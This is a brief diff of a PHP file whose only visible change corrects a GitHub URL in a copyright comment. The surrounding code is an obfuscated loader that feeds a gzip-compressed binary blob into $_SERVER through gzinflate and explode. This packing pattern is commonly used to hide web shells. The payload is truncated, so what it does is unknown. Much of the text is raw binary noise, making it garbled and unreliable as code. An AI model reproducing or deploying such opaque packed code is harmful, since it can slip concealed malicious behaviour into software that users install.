@@ -1,7 +1,7 @@
 ```yarn
 <?php 
         /** 
-         *-- © : https.//Github.com/bylickilabs
+         *-- © : https://Github.com/bylickilabs
 		 */
           error_reporting(E_ALL^E_NOTICE);define('O0', 'O');¹¯«ôö«âÅô‚‡ìù¤¨ŒÃÞ‰‚Í°Òï¸Æëˆ¡¬;$_SERVER[O0] = explode('|||', gzinflate(substr('‹      íýsÛ¶õn·Ûþ+0eñÚ:õaË²k«MœfM¯½Å»\\×µ
 HB"`Ò²²lNïú_îáƒ%Ñ²DYò¶Ô—àï õöíÛ1loŸy2þ|ŸDÓrsÞ`òåâ¨›Êåý7hýõrÀ…LCOÆ!õ‡tïÌ»t‡B,o=ëq– Ÿ‡\\œW	*_ôßý¯KS™ÀIÛÁLk®Çwpæ*
